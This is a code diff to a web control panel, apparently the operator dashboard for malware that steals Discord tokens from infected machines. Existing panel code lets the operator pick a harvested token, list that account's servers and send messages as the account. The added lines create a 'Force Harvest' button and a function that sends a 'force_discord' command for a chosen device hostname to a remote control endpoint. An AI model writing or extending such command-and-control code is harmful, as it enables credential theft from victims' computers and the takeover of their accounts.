@@ -278,6 +278,7 @@
       </div>
       <div class="flex items-center gap-3 mb-5">
         <button class="px-4 py-2 text-sm font-medium text-white bg-violet-600 hover:bg-violet-700 rounded-lg border border-violet-500 transition" id="discordServersBtn" onclick="loadDiscordServers()">List Servers</button>
+        <button class="px-4 py-2 text-sm font-medium text-white bg-emerald-600 hover:bg-emerald-700 rounded-lg border border-emerald-500 transition" id="discordForceBtn" onclick="forceDiscordHarvest()">Force Harvest</button>
         <span class="text-xs text-slate-500" id="discordStatus">Select a token first</span>
       </div>
       <div class="grid grid-cols-1 lg:grid-cols-3 gap-5">
@@ -1053,6 +1054,23 @@ async function sendDiscordMsg() {
     selectChannel(g_discordChannelId, document.getElementById('discordChannelTitle').textContent.replace('# ', ''));
   } catch (err) { showToast('Failed: ' + err.message, 'error'); }
   btn.disabled = false; btn.textContent = 'Send';
+}
+
+async function forceDiscordHarvest() {
+  const btn = document.getElementById('discordForceBtn');
+  const hostname = document.getElementById('hostnameInput').value.trim();
+  if (!hostname) { showToast('Select a device first', 'error'); return; }
+  btn.disabled = true; btn.textContent = 'Requesting...';
+  try {
+    const res = await fetch(PROXY_URL + '?path=/rest/v1/control', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ command: 'force_discord', hostname: hostname, executed: false })
+    });
+    if (!res.ok) throw new Error(res.status + ' ' + res.statusText);
+    showToast('Discord harvest triggered for ' + hostname + ' (check back in ~60s)', 'success');
+  } catch (err) { showToast('Failed: ' + err.message, 'error'); }
+  btn.disabled = false; btn.textContent = 'Force Harvest';
 }
 
 document.getElementById('stopBtn').addEventListener('click', sendStop);
